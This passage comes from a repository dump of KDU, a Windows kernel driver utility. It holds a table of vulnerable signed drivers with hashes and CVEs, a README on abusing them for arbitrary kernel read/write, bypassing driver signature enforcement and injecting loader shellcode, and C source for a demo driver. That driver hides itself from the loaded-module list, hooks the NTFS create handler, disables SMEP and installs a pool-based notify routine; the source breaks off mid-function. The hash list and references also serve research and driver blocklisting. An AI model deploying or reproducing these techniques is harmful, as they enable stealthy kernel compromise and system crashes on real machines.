|11|WINIO||**File(SHA1):** A87D6EAC2D70A3FBC04E59412326B28001C179DE<br>**Authenticode(SHA1):** 6B60825564B2DCCFF3A4F904B71541BFE94136C9<br>**Page(SHA1):** 8911B97A3140C2523287E1039B08DE8EF4D7F9AB<br>**Page(SHA256):** 85859FFD16396D0FE9897BAFBDCE94FF66474DCDEF7754FCDF2C9C7A8CE451DB |
|12|Semi-original|CVE-2019-8372|**File(SHA1):** 3FD55927D5997D33F5449E9A355EB5C0452E0DE3<br>**Authenticode(SHA1):** 87C155D933CA3513E29D235562D96B88D3913CDE<br>**Page(SHA1):** B565361205846323911766F55E380D93C6A3AB02<br>**Page(SHA256):** 4818AA3F52BCF3554131B56A3A0F0C2D8BBB5F6D18837F68D811EAD7917A2DE3 |
|13|WINIO|CVE-2021-28685|**File(SHA1):** AA2EA973BB248B18973E57339307CFB8D309F687<br>**Authenticode(SHA1):** 92FEE95E32A727D135F1F46CA98C201FFFBF6950<br>**Page(SHA1):** C5F1D135831851E9D7A06F9636E2A50B1D5C3A04<br>**Page(SHA256):** B4DCE5B50224C2461B49F1850C73EF84E65A64D89E2F32DD931A2F3C62D9D6BF |
|14|Original|CVE-2020-15481|**File(SHA1):** 2DB49BDF8029FDCDA0A2F722219AE744EAE918B0<br>**Authenticode(SHA1):** F1BDD3236F43338A119D74ECA730F0D464DED973<br>**Page(SHA1):** A14331F63EC907BF3E472F1E0CB8F19DE06EF4E4<br>**Page(SHA256):** 7F0A28CCF0AB76964D40E063F9D4B88193B77E4BADF66E8C8F87C97127885987 |
|15|Original||**File(SHA1):** 83506DE48BD0C50EA00C9E889FE980F56E6C6E1B<br>**Authenticode(SHA1):** 0BCA6C35159282FD64615ABC4D398399B061847B<br>**Page(SHA1):** 0882AB6651CD17F3D7D696E9C48EB4934159AE4C<br>**Page(SHA256):** 0F5DE6DE77D764E2370FA69D3CD8B2C0EC4DFC6F6736C7EDE97F3F75567ED47A |
|16|Original|CVE-2021-21551|**File(SHA1):** C948AE14761095E4D76B55D9DE86412258BE7AFD<br>**Authenticode(SHA1):** E3C1DD569AA4758552566B0213EE4D1FE6382C4B<br>**Page(SHA1):** E09B5E80805B8FE853EA27D8773E31BFF262E3F7<br>**Page(SHA256):** 7E2AD3D6D76F4FCD4583B865FFC12DE6C44FC16CBCBB81D480CB067F2A860422 |
|17|Original||**File(SHA1):** A8DDB7565B61BC021CD2543A137E00627F999DCC<br>**Authenticode(SHA1):** 0E732D18A7D880F0505433A0DA0E100DA0E1C3A3<br>**Page(SHA1):** A1E322631A67DE6441A08C991352281CF7C83FD8<br>**Page(SHA256):** 787AC1DB370421BD26915EAE797F67AD4C6E53775970DC18226ED5225B0B8A3B |
|18|Original||**File(SHA1):** D8498707F295082F6A95FD9D32C9782951F5A082<br>**Authenticode(SHA1):** 61B55BB7C111F93BD3EA9AC71591E1A6B89FEEE1<br>**Page(SHA1):** 15FA18C40598FFD05C7F99DB81EEEA1336FC4213<br>**Page(SHA256):** B6033C16527F2ADBC9E8E5C7678F649E55009319B8612765686ACB1A1C82FDDA |
|19|Original||**File(SHA1):** 3296844D22C87DD5EBA3AA378A8242B41D59DB7A<br>**Authenticode(SHA1):** EDC10781EB6D1E3BDF9D15CFEBDDBE1A1FB804D9<br>**Page(SHA1):** AF2B5A3F4DBCE417295FB2CECD8DF91C5A679D44<br>**Page(SHA256):** 2C22F27671EE4C530C16821CEE2A9F48C19F99B873E36D94C4AAA0194D52B8CB |
|20|Original|CVE-2021-36276|**File(SHA1):** 90A76945FD2FA45FAB2B7BCFDAF6563595F94891<br>**Authenticode(SHA1):** 6BC2AB0F03D7A58685A165B519E8FEE6937526A6<br>**Page(SHA1):** 66B2E2438725B576428CBEAE3E481148B4B5FD8C<br>**Page(SHA256):** C60578FAD95216EF74BCD9661A562C0DDC2C8697D64B546F59A7EF85F71D3814 |
|21|Original||**File(SHA1):** A54AE1793E9D77E61416E0D9FB81269A4BC8F8A2<br>**Authenticode(SHA1):** 1BE4BA36BA9CE5B10D90137C08CC21F823379841<br>**Page(SHA1):** 2EF1502DDE6A1CB120AC379F8C7155EB96E4BA02<br>**Page(SHA256):** F7443FBAC813EAF0AA94C73265C3BE7E723A5BF64BEF1D80E8FF57D7573FC53C |
|22|WINIO||**File(SHA1):** CFA85A19D9A2F7F687B0DECDC4A5480B6E30CB8C<br>**Authenticode(SHA1):** 4BFC51E23494F7EAF27560F92CD6FBCED2FFA4F6<br>**Page(SHA1):** 09C0DC0C0440F9362BD29960236CD716B3E21453<br>**Page(SHA256):** 209D5B95C83B4923C825DF9F3DE5F5EFCEFA0C2F82FD77D9BB38FE41E81B3D02 |
|23|Original||**File(SHA1):** 4E56E0B1D12664C05615C69697A2F5C5D893058A<br>**Authenticode(SHA1):** 6E87CD3B027A07A810164D618E3F2FCE61EB6EC4<br>**Page(SHA1):** 45F1309E10159325BA1DFAE4CAE214BD07B355F1<br>**Page(SHA256):** EF15F8CE1C905139AC64C15C2E91E808054421D2B95E2F531EFC6FC5D9D2A471 |
|24|MAPMEM|CVE-2022-22516|**File(SHA1):** E1069365CB580E3525090F2FA28EFD4127223588<br>**Authenticode(SHA1):** 432B5809D84935D15574DE8D64B22E06682FF715<br>**Page(SHA1):** 13EA5846AFE3B9141C712FAFBA9F1B95B26087E5<br>**Page(SHA256):** 6E0C60A5AA46C6CCE7EB4EFA8D36D6D343C0D26694D8A9E194F254988603FC26 |
|25|Original|CVE-2021-31728, CVE-2022-42045|**File(SHA1):** 290D6376658CF0F8182DE0FAE40B503098FA09FD<br>**Authenticode(SHA1):** 084553447BDBC056BBE49BAD8ACFAF25EB83462A<br>**Page(SHA1):** 760DE62D6AF5F8CD46E2B2074CDF7B0805B58484<br>**Page(SHA256):** 8BFEE3E7582C0432CD02A8D75D00B8CBA9CD9A2525E3E61E0D0C8AAAC2FCFEEB |
|26| WINIO||**File(SHA1):** 6AFC6B04CF73DD461E4A4956365F25C1F1162387<br>**Authenticode(SHA1):** 8E1F51761F21148F68AC925CC5F9E9C78F3D5EC4<br>**Page(SHA1):** 83714FAAF1643DBA7ABF28A4AC287A43FDEBDE81<br>**Page(SHA256):** 1D665C5DDA5E49B5C7F5231327D4A41D83201107CF428800EF24FDBB1CC505F7 |
|27|Original||**File(SHA1):** 01B95AE502AA09AABC69A0482FCC8198F7765950<br>**Authenticode(SHA1):** 4AEA4FBB9A732D57643F61F1BF3B82CEBB18AB72<br>**Page(SHA1):** 981F8CC044C6E21E2A4746B47EBEBAEEF49B9114<br>**Page(SHA256):** 50F9C8874653A6C25179C33EAEB19A6EC4C21BCB1EB14429DD0746C338766911 |
|28|RWEverything|CVE-2020-15368|**File(SHA1):** B0032B8D8E6F4BD19A31619CE38D8E010F29A816<br>**Authenticode(SHA1):** F621633290173DAAC18BB14CA3F52BC027CD2721<br>**Page(SHA1):** 32F6424734185AF58281EA4C66805A8238E61427<br>**Page(SHA256):** 281D8225E91591F799F93BF448F78F3F50B9AA7D6F1ADD3E2AC58D6BA0DE1473 |
|29|Original||**File(SHA1):** 256D285347ACD715ED8920E41E5EC928AE9201A8<br>**Authenticode(SHA1):** 530DD2863A09DC57801D62551C48EB9E48476FE8<br>**Page(SHA1):** 845EE7617D94A6A13016419B94CFC2D15D9BB71A<br>**Page(SHA256):** C13FDB8225E21B899A340506DB055B949C941A33D8C2D73C81E46BF5C4DDFF47 |
|30|Original|CVE-2020-12928|**File(SHA1):** CEC887F20AB468CAA1C99FCBE7FBDFAB25FADF39<br>**Authenticode(SHA1):** E37C6AA2630FA3CCB3EE7D219A7332CCE95FA11F<br>**Page(SHA1):** 70A164E25FD351CEDFEDEB3D89871A1D487D0379<br>**Page(SHA256):** E47556832FA7CF286FFD7F7A0646FA8015AF651D5C968F20353F6B7CFF18A1DC |
|31|Original||**File(SHA1):** 17614FDEE3B89272E99758983B99111CBB1B312C<br>**Authenticode(SHA1):** FD0CB3EA1DEB4FDB22536A7C15669EB53315E5C8<br>**Page(SHA1):** 0D03AC1B15AE10BB40A7660F25F3A68E1330024E<br>**Page(SHA256):** CB27AD883FCF265B8E2C8D393C0B403914C1911A935A5D248B4C37B4D99CD7BE |
|32|Original|CVE-2022-3699|**File(SHA1):** B89A8EEF5AEAE806AF5BA212A8068845CAFDAB6F<br>**Authenticode(SHA1):** 6D9543725ACA0C9C8F403425952692CCC1D2D7F2<br>**Page(SHA1):** B40A38E4D3BFB567F313A190A30F3AA9189EC1A0<br>**Page(SHA256):** 4273E0BE1A21142DE6BA672EFDAC0AC1FADC7AF0D0DAACA4E4D330D02C8F4CC8 |
|33|Original|CVE-2019-12280|**File(SHA1):** D0A228ED8AF190DEC0C1A812E212F5E68EE3B43E<br>**Authenticode(SHA1):** 85D493F5636B46F6C4F8B1028F8E8659F31DC562<br>**Page(SHA1):** A48431302A6C5053D178FCEC3390FBC1CACCB893<br>**Page(SHA256):** 08AFD2489CB6A093E3F588B1D13D20468AE3E27A2F0AEC9E43C41D20FFB2F6EE |
|34|WINIO||**File(SHA1):** 9745D77E3C27437BBCCF39E074F7D57A99FE83B1<br>**Authenticode(SHA1):** 1419392FC1EC6EF497442FEE3F7553A68B78A03D<br>**Page(SHA1):** 863F4AFE82D791D655B2DCE5C893B37422364230<br>**Page(SHA256):** F3165AFC15FA99745D7151501E1E2A738AD04DA5A4E76E5CE135B8E247AE0D1D |
|35|Original||**File(SHA1):** A57EEFA0C653B49BD60B6F46D7C441A78063B682<br>**Authenticode(SHA1):** 96FAA975FEB28588372A98A1E77D98AF7FC90E41<br>**Page(SHA1):** 197859EEFBCF17BE48A3C49818B35F263701755F<br>**Page(SHA256):** 5C8C0FC9B3B7C6C7E6BDD83A8D3ED44E075D9C3B42463E1CC5EE28049517488E |
|36|Original||**File(SHA1):** 090A4FC285D4F47B1E6A1011353A329C1F4C8E09<br>**Authenticode(SHA1):** C77403CFFCD15438EA3DDDF0763AB0A70A9100CB<br>**Page(SHA1):** DCCA45C770E93BCF9FC7A9ADFC4653AE744C798C<br>**Page(SHA256):** DE88E584BC88C463F479CAA5A6F4C166B8180E2AEAC62A54879875D374704631 |
|37|Original||**File(SHA1):** 3303BA52A334DA58A4992C4F9FBA7272E294B7AF<br>**Authenticode(SHA1):** 43239D3355CED44FB56C4127BF96EF2ED1BE2780<br>**Page(SHA1):** 6ECDAAECEB20B8D037FD4508A4B1DCE1ADCD2203<br>**Page(SHA256):** 6DA94C767419BAFB993B39913CD99146EB80FC13B5A6D5DE96829E084D4CFC83 |
|38|Original||**File(SHA1):** F3383FE0FF00BDEA1AA9E68BCAAD8B83885E306D<br>**Authenticode(SHA1):** D889E03CE654903A5113F49F49A1C23F3317E7D0<br>**Page(SHA1):** 0773B431922B3208DB0C4A4E02F9CE7297AAE774<br>**Page(SHA256):** AE38ADF8B97188675D8F6396F2DC0801C60CBFD546CAEDE915B73E9332DF6C8C |
|39|Original|CVE-2023-38817|**File(SHA1):** A93197C8C1897A95C4FB0367D7451019AE9F3054<br>**Authenticode(SHA1):** 678620A9CC9E7FFE179BC5CDA0A2DD0597E231EE<br>**Page(SHA1):** 832832028D40A3CFD08D364554FCE0B4F37317FF<br>**Page(SHA256):** 49ED19D5E1E122936035A48EA99FFD68CA4915578107888D5C2B0BB9E30E67C0 |
|40|Original||**File(SHA1):** BDA102AFBC60F3F3C5BCBD5390FFBBBB89170B9C<br>**Authenticode(SHA1):** 0FB1D0EF14AB73FCB4C62043859064CC5F9F88C2<br>**Page(SHA1):** B754B2C62796004560E2ADF5178099B98F111C25<br>**Page(SHA256):** 83D2A9535CDB68A8D6EAE5582DB7A70E01A520151448CEB572D96566A2AECB82 |
|41|Original|CVE-2023-41444|**File(SHA1):** D2FB46277C36498E87D0F47415B7980440D40E3D<br>**Authenticode(SHA1):** 719F659300BA463EFEEAB5916F0378C64FC1AD4A<br>**Page(SHA1):** F7FEA2BE8FF65DBB89BAF39EF8E0D80DAB81CB8E<br>**Page(SHA256):** 5FEB045C2452FD280BA1CAD5FC9B4F0DE7FC95EABDCE19FA2CD1F632891F3B1A |
|42|WINRING0||**File(SHA1):** 177B541412A45646177B2352FA2D9E89E0EEFE5A<br>**Authenticode(SHA1):** 200ABD07303234FC114360D9DABC38DA1F1F2A22<br>**Page(SHA1):** 84B91B1AED8F83DE14323089148BE2577FDC826C<br>**Page(SHA256):** B8502DB6B8947E5D852102166D0BEF8252EA3431D582E968EF44C35E56609C91 |
|43|Original|CVE-2017-9769|**File(SHA1):** F999709E5B00A68A0F4FA912619FE6548AD0C42D<br>**Authenticode(SHA1):** 1AC31466261A6DA69FBEB8E99D0B7B772071AC7F<br>**Page(SHA1):** 4EC299E9A539F6BC194BD3D436B24A565BD32EF4<br>**Page(SHA256):** C8CE0EE4FF58779A292B5626D9953888A1A04799E18924CB7A075095C25042E8 |
|44|Original|CVE-2023-20598|**File(SHA1):** A24840E32071E0F64E1DFF8CA540604896811587<br>**Authenticode(SHA1):** 661A1A28950CEC3F2C3D0E72AB2A05D4A173CF9A<br>**Page(SHA1):** 869BED04EB66492AC532E36C3C6171AB34DA1A00<br>**Page(SHA256):** E5DC6305227951B05997CD147C59795991F7EDE52461D069EFE1D568DD25C580 |
|45|Original|CVE-2020-12928|**File(SHA1):** 17D28A90EF4D3DBB083371F99943FF938F3B39F6<br>**Authenticode(SHA1):** 9A329362E340FC8363E67FB5F23A8391CB83BF00<br>**Page(SHA1):** 0BC84A62ABD3CA20305FB834592928C2317439D6<br>**Page(SHA256):** 76C7A12CDE2FDC80A6AF0A58E7698FC1F5EC8746EFB461FB07155B7065480715 |
|46|WINIO||**File(SHA1):** AEC96520E85330594D3165C86CB92EAC34C1E095<br>**Authenticode(SHA1):** A7179D7CF5EE58276C3C42A16195A0B733F31B53<br>**Page(SHA1):** AF7FED1C68BB2D459F7778EC6D20459618CF3D26<br>**Page(SHA256):** 490B1FFC374F9CDEC57BBCE9DAD93251516DE93C7A7F3475D8AC55A6DCBB958E|
|47|Original||**File(SHA1):** DA66B66DCA5EA8689DB903EC23E98F2C881DE6F8<br>**Authenticode(SHA1):** A8D16FED8999033126D60C656A3BA359DFAA559F<br>**Page(SHA1):** 082FBFF03465F78276D5A2066398A9D3C73DB9AB<br>**Page(SHA256):** F677A9447400EAEE6E12A88F59AAADCF6DDF8F16EC8F7612BF50AB378A9B9012|
|48|RWEverything||**File(SHA1):** 3F6A997B04D2299BA0E9F505803E8D60D0755F44<br>**Authenticode(SHA1):** E7FAC017B371A43276E03BF5F71D437E8D377930<br>**Page(SHA1):** EE9A5A98C257F2D50030B7F3AB6D7DA805FCC150<br>**Page(SHA256):** D159D969E05C83F27F446BCC5F171A0043CC3DF0B518962CEE7ACBE30BCC02F8|
|49|RWEverything||**File(SHA1):** 6074C2360F5DC74738873A525DFBD67EB6625986<br>**Authenticode(SHA1):** 03C523F31603C460076AD549F985DD9533734E95<br>**Page(SHA1):** 85B6FC43E943C9EB9B3DE1FF82A56870620CC1CF<br>**Page(SHA256):** A3AF7747FAC60B814FA6717B174F1199B9D163081B55AE40CEDD9983B6D033F5|
|50|RWEverything||**File(SHA1):** 11D7E0D29AB17292FD43BDD5CCB7DA0403E50E52<br>**Authenticode(SHA1):** CA06D9FD91F7B681204B35975D5C069D0DABE276<br>**Page(SHA1):** B7693E1170B01F24A824892607C2258CA653805A<br>**Page(SHA256):** B8776F6889CF3D8252F0912DD9745F8EFF4513292DF2B2B1D484CDBC68FBAE4C|
|51|RWEverything||**File(SHA1):** B1FAD5DA173C6A603FFFE20E0CB5F0BDCA823BD5<br>**Authenticode(SHA1):** 268073AD0B17E2161C1A2A6C5B1BDEBB7B3011B4<br>**Page(SHA1):** 0B48F35DAF8B8BC9BA4E413EF222415EAB791AE0<br>**Page(SHA256):** B073907634013A8EB65E4C8AA42535BAD08101E58B7B1489AEE395B7BE9C69E2|
|52|Original||**File(SHA1):** 9E5FCAEA33C9A181C56F7D0E4D9C42F8EDEAD252<br>**Authenticode(SHA1):** 7919108CB1278503EC4A78DD25694C6770EAA989<br>**Page(SHA1):** E1CE5A5E2CEB0AAD9CB588A900BF471462FAC42B<br>**Page(SHA256):** 6991344C8771FC717F878F9A6B0C258BC81FB3BF1F7F3CBED3EF8F86541B253F|
|53|WINRING0||**File(SHA1):** DB8BCB8693DDF715552F85B8E2628F060070F920<br>**Authenticode(SHA1):** 8C40A82DF3D606A87DF243C787283C26CE9B0458<br>**Page(SHA1):** F7362528C0118F895D4D51588102C51A09B1691C<br>**Page(SHA256):** 2A8B9C786DEA17F00E105BFEF82B723E2578150E814DD9A94ED007275C96AC25|
|54|Original|CVE-2025-45737|**File(SHA1):** 7E6DD5F1363C3070C59378EC8B23B6EC7B5671B4<br>**Authenticode(SHA1):** 5C41FA80052C332F7D6323C91E84E1204BA1C1C7<br>**Page(SHA1):** 5670C9130CC8997FBA6BD1C615F0DA97DC1FD43C<br>**Page(SHA256):** 34B6E417ABA41F5C7D7EE260AF1F56D9A74519F64B8E15BB510A295D2F9ED464|
|55|Original|CVE-2025-7771|**File(SHA1):** 82ED942A52CDCF120A8919730E00BA37619661A3<br>**Authenticode(SHA1):** 77BADFEEBC7F448E6B8A52DCF15F48506A0E9A58<br>**Page(SHA1):** 42E937C9E56931AFDE500D68CDA682F8A5997CAF<br>**Page(SHA256):** 05E896E9337F2F6119571B31F3E5C279B357631C439912172E07526A4B5C23A5|
|56|Original||**File(SHA1):** C1130E09831C7A2E0CC8BA7335E702910B25F526<br>**Authenticode(SHA1):** 8057487B702996C56D4CBB96A0C63A6ED82271B5<br>**Page(SHA1):** 7A1F9284A89B31BF572487F3021415AA0B583F18<br>**Page(SHA256):** 8E141BAB9656CB687407C0BDF8488FCD80631DA8EDE60C12EDF5DDC6D76AF1EC|

###### *At commit time, data may be inaccurate.

More providers may be added in the future.

# How it works

It uses known vulnerable (or wormhole by design) drivers from legitimate software to access arbitrary kernel memory with read/write primitives.

Depending on the command, KDU will either work as TDL/DSEFix or modify kernel mode process objects (EPROCESS). 

When in -map mode, KDU for most available providers will by default use a 3rd party signed driver from SysInternals Process Explorer and hijack it by placing a small loader shellcode inside its IRP_MJ_DEVICE_CONTROL routine.

# Shellcode versions

KDU uses shellcode to map input drivers and execute their DriverEntry. There are a few shellcode variants embedded into KDU. Shellcode V1, V2, and V3 are used together with 3rd party victim driver (Process Explorer, etc.).

# Build and Notes

KDU comes with full source code.
To build from source, you need Microsoft Visual Studio 2019 or later. For driver builds, you need Microsoft Windows Driver Kit 10 and/or above.

Complete working binaries include: kdu.exe (main executable) and drv64.dll (drivers database). They must reside in the same directory with R/W access enabled for kdu.exe. All binaries MUST be unblocked from the system zone.

# Utils and Notes

GenAsIo2Unlock is a special utility used to generate "unlocking" resources required for working with the AsIO2 driver. Full source of this utility is included in Source\Utils\GenAsIo2Unlock. Compiled binary is not provided.

# Reporting bugs and incompatibilities

If you experience a bug or incompatibility while using KDU with 3rd party software or OS, feel free to fill an issue. However, if this incompatibility is caused by your own actions, such reports will be ignored.

Anticheat, antimalware incompatibilities will be ignored, that's your own responsibility.

# Disclaimer

Using this program might crash your computer with a BSOD. Compiled binary and source code are provided AS-IS in the hope they will be useful BUT WITHOUT WARRANTY OF ANY KIND. Since KDU relies on completely bugged, vulnerable drivers, it is highly recommended to use it on virtual machines only.

# Changelog

https://github.com/hfiref0x/KDU/tree/master/CHANGELOG.txt

# Third party code usage

* TinyAES, https://github.com/kokke/tiny-AES-c
* whirlpool, https://github.com/mabako/mta-whirlpool

# References

* DSEFix, https://github.com/hfiref0x/DSEFix
* Turla Driver Loader, https://github.com/hfiref0x/TDL
* Stryker, https://github.com/hfiref0x/Stryker
* Unwinding RTCore, https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html
* CVE-2019-16098, https://github.com/Barakat/CVE-2019-16098
* CVE-2015-2291, https://www.exploit-db.com/exploits/36392
* CVE-2018-19320, https://seclists.org/fulldisclosure/2018/Dec/39
* ATSZIO64 headers and libs, https://github.com/DOGSHITD/SciDetectorApp/tree/master/DetectSciApp
* ATSZIO64 ASUS Drivers Privilege Escalation, https://github.com/LimiQS/AsusDriversPrivEscala
* CVE-2019-18845, https://www.activecyber.us/activelabs/viper-rgb-driver-local-privilege-escalation-cve-2019-18845
* DEFCON27: Get off the kernel if you can't drive, https://eclypsium.com/wp-content/uploads/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf
* CVE-2019-8372: Local Privilege Elevation in LG Kernel Driver, http://www.jackson-t.ca/lg-driver-lpe.html
* CVE-2021-21551, https://attackerkb.com/topics/zAHZGAFaQX/cve-2021-21551
* KDU v1.1 release and bonus (AsIO3.sys unlock), https://swapcontext.blogspot.com/2021/04/kdu-v11-release-and-bonus-asio3sys.html
* GhostEmperor: From ProxyLogon to kernel mode, https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/
* KDU v1.2 release and the wonderful world of Microsoft incoherency, https://swapcontext.blogspot.com/2022/02/kdu-v12-release-and-wonderful-world-of.html
* How to exploit a vulnerable Windows driver, https://github.com/stong/CVE-2020-15368
* CVE-2022-3699, https://github.com/alfarom256/CVE-2022-3699
* LOLDrivers, https://www.loldrivers.io
* ECHOH NO, https://github.com/kite03/echoac-poc/
* NVDrv, https://github.com/zer0condition/NVDrv
* CVE-2023-41444, https://blog.dru1d.ninja/windows-driver-exploit-development-irec-sys-a5eb45093945
* CVE-2023-20598, https://www.amd.com/en/resources/product-security/bulletin/amd-sb-6009.html
* CVE-2020-12928, https://h0mbre.github.io/RyzenMaster_CVE/
* CVE-2025-45737, https://github.com/smallzhong/NeacController
* CVE-2025-7771, https://securelist.com/av-killer-exploiting-throttlestop-sys/117026/

# Wormhole drivers code

They are used in multiple products from hardware vendors, mostly in unmodified state. They all break the OS security model and are additionally bugged. Links are for educational purposes on how not to do things in driver development.

* WinIo 3.0 BSOD/CVE generator, https://github.com/hfiref0x/Misc/tree/master/source/WormholeDrivers/WINIO
* WinRing0 BSOD/CVE generator, https://github.com/hfiref0x/Misc/tree/master/source/WormholeDrivers/WINRING0
* PhyMem BSOD/CVE generator, https://github.com/hfiref0x/Misc/tree/master/source/WormholeDrivers/PHYMEM
* MapMem BSOD/CVE generator, https://github.com/hfiref0x/Misc/tree/master/source/WormholeDrivers/MAPMEM
* InpOut BSOD/CVE generator, https://github.com/hfiref0x/Misc/tree/master/source/WormholeDrivers/INPOUT
* Intel infamous driver, https://github.com/hfiref0x/Misc/tree/master/source/IntelNal

# Authors

(c) 2020 - 2026 KDU Project

```

`Source/Examples/BadRkDemo/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2021
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.02
*
*  DATE:        02 Apr 2021
*
*  PatchGuard BSOD generator.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "main.h"

RTL_OSVERSIONINFOW g_osver;

typedef NTSTATUS(NTAPI * pfnDispatch)(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp);

pfnDispatch g_NtfsFsdCreateOriginal = NULL;

/*
* ModifyPsLoadedModuleList
*
* Purpose:
*
* Modify PsLoadedModulesList by removing entry from it.
*
* Expected PG BSOD: Loaded module list modification.
*
*/
#pragma warning(push)
#pragma warning(disable: 28175) //private member of struct
NTSTATUS ModifyPsLoadedModuleList(
    _In_ DEVICE_OBJECT *DeviceObject)
{
    DRIVER_OBJECT *DriverObject = DeviceObject->DriverObject;
    KLDR_DATA_TABLE_ENTRY *LoaderSection = (KLDR_DATA_TABLE_ENTRY*)DriverObject->DriverSection;

    //
    // Corrupt list.
    //
    if (RemoveEntryList(&LoaderSection->InLoadOrderLinks))
        return STATUS_SUCCESS;

    return STATUS_UNSUCCESSFUL;
}
#pragma warning(pop)

NTSTATUS NtfsFsdCreateHook(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp)
{
    if (KeGetCurrentIrql() == PASSIVE_LEVEL) {

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[PGDemo] NtfsFsdCreate called\r\n");
    }
    return g_NtfsFsdCreateOriginal(DeviceObject, Irp);
}

/*
* ModifyDriverObject
*
* Purpose:
*
* Modify driver object by replacing IRP handler for NTFS->IRP_MJ_CREATE.
*
* Expected PG BSOD: Driver object corruption.
*
*/
#pragma warning(push)
#pragma warning(disable: 28175) //private member of struct
NTSTATUS ModifyDriverObject(
    VOID)
{
    NTSTATUS Status;
    UNICODE_STRING fsdName;
    PDRIVER_OBJECT drvNtfs;

    RtlInitUnicodeString(&fsdName, L"\\FileSystem\\NTFS");

    //
    // Modify driver object
    //
    Status = ObReferenceObjectByName(
        &fsdName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        0,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &drvNtfs);

    if (NT_SUCCESS(Status)) {

        g_NtfsFsdCreateOriginal = InterlockedExchangePointer(
            (PVOID*)&drvNtfs->MajorFunction[IRP_MJ_CREATE],
            (PVOID)NtfsFsdCreateHook);

        ObfDereferenceObject(drvNtfs);
    }

    return Status;
}
#pragma warning(pop)

typedef struct _CPUInfo {
    int eax;
    int ebx;
    int ecx;
    int edx;
} CPUInfo, *PCPUInfo;

/*
* ModifyCR4
*
* Purpose:
*
* Modify CR4 by turning off SMEP (if supported).
*
* Expected PG BSOD: A processor control register.
*
*/
NTSTATUS ModifyCR4(
    VOID)
{
    ULONG_PTR cr4;

    CPUInfo cpuInfo = { 0, 0, 0, 0 };

    KeSetSystemAffinityThread(0x00000001);

    __cpuid((int*)&cpuInfo, 7);

    if (cpuInfo.ebx & (1 << 7)) {

        //
        // Modify CR4, disable SMEP.
        //
        cr4 = __readcr4();

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[PGDemo] cr4 value, before = %llx\r\n", cr4);

        cr4 &= ~(1 << 20);
        __writecr4(cr4);

        cr4 = __readcr4();

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[PGDemo] cr4 value, after = %llx\r\n", cr4);

        return STATUS_SUCCESS;
    }

    return STATUS_NOT_SUPPORTED;
}

// xor eax, eax
// retn
unsigned char StubRoutine[] = { 0x33, 0xC0, 0xC3 };

/*
* SetNotifyFromPool
*
* Purpose:
*
* Allocate nonpaged executable pool and use it as LoadImageNotifyRoutine code.
*
* Expected PG BSOD: Kernel notification callout modification.
*
*/
#pragma warning(push)
#pragma warning(disable: 6014) //leaking memory
#pragma warning(disable: 30030) //executable memory
NTSTATUS SetNotifyFromPool(
    VOID)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PVOID CodeBuffer;

    CodeBuffer = ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'edgP');
    if (CodeBuffer) {
        RtlSecureZeroMemory(CodeBuffer, PAGE_SIZE);
        RtlCopyMemory(CodeBuffer, StubRoutine, sizeof(StubRoutine));
        status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)CodeBuffer);

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[PGDemo] CodeBuffer=%p, PsSetLoadImageNotifyRoutine=%lx\r\n", CodeBuffer, status);
    }
    return status;
}
#pragma warning(pop)

/*
* DevioctlDispatch
*
* Purpose:
*
* IRP_MJ_DEVICE_CONTROL dispatch.
*
*/
NTSTATUS DevioctlDispatch(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp
)
{
    NTSTATUS				status = STATUS_SUCCESS;
    ULONG					bytesIO = 0;
    PIO_STACK_LOCATION		stack;
    PINOUTPARAM             rp;

    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[PGDemo] %s IRP_MJ_DEVICE_CONTROL\r\n", 
        __FUNCTION__);

    stack = IoGetCurrentIrpStackLocation(Irp);

    do {

        if (stack == NULL) {
            status = STATUS_INTERNAL_ERROR;
            break;
        }

        rp = (PINOUTPARAM)Irp->AssociatedIrp.SystemBuffer;
        if (rp == NULL) {
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case PGDEMO_SET_TEST_TYPE:


            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL,
                "[PGDemo] %s PGDEMO_SET_TEST_TYPE hit\r\n", 
                __FUNCTION__);

            if (stack->Parameters.DeviceIoControl.InputBufferLength != sizeof(INOUT_PARAM)) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }

            switch (rp->TestType) {

            case TT_DRIVER_LIST:

                DbgPrintEx(DPFLTR_DEFAULT_ID,
                    DPFLTR_INFO_LEVEL,
                    "[PGDemo] Corrupting drivers list\r\n");

                status = ModifyPsLoadedModuleList(DeviceObject);
                break;

            case TT_DRIVER_OBJECT:

                DbgPrintEx(DPFLTR_DEFAULT_ID,
                    DPFLTR_INFO_LEVEL,
                    "[PGDemo] Corrupting driver object\r\n");
                
                status = ModifyDriverObject();
                break;

            case TT_CR4:

                DbgPrintEx(DPFLTR_DEFAULT_ID,
                    DPFLTR_INFO_LEVEL,
                    "[PGDemo] Corrupting CPU Control Register\r\n");
                
                status = ModifyCR4();
                if (status == STATUS_NOT_SUPPORTED) {

